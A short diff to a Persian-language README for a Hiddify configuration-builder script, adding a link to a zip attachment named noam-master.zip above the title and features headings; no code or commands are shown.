@@ -1,3 +1,4 @@
+[noam-master.zip](https://github.com/user-attachments/files/17021043/noam-master.zip)
 ## اسکریپت ساخت کانفیگ هیدیفای
 ---
 ## قابلیت ها
